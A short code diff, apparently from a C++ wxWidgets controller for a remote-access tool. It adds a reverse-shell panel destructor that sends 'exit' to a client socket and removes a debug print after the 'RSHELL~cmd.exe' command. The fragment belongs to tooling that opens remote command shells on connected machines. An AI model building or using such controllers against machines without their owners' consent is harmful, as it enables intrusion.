@@ -181,6 +181,22 @@ panelTest::panelTest(wxWindow* pParent) :
     this->lblOutputTest = new wxStaticText(this, EnumIDS::ID_Panel_Label_Test, wxT("Output"), wxPoint(20, 20));
 }
 
+panelReverseShell::~panelReverseShell() {
+    std::vector<struct Cliente> vc_Copy;
+    std::unique_lock<std::mutex> lock(vector_mutex);
+
+    vc_Copy = p_Servidor->vc_Clientes;
+    lock.unlock();
+
+    for (auto aClient : vc_Copy) {
+        if (aClient._id == this->strID) {
+            std::string strComando = "exit\r\n";
+            p_Servidor->cSend(aClient._sckCliente, strComando.c_str(), strComando.size(), 0, false);
+            break;
+        }
+    }
+}
+
 panelReverseShell::panelReverseShell(wxWindow* pParent) :
     wxPanel(pParent, EnumIDS::ID_Panel_Reverse_Shell) {
     wxWindow* wxTree = (MyTreeCtrl*)this->GetParent();
@@ -211,7 +227,6 @@ panelReverseShell::panelReverseShell(wxWindow* pParent) :
         if (aClient._id == this->strID) {
             std::string strComando = "RSHELL~cmd.exe";
             int ib = p_Servidor->cSend(aClient._sckCliente, strComando.c_str(), strComando.size(), 0, false);
-            std::cout << "SENT " << ib << "\n";
             break;
         }
     }
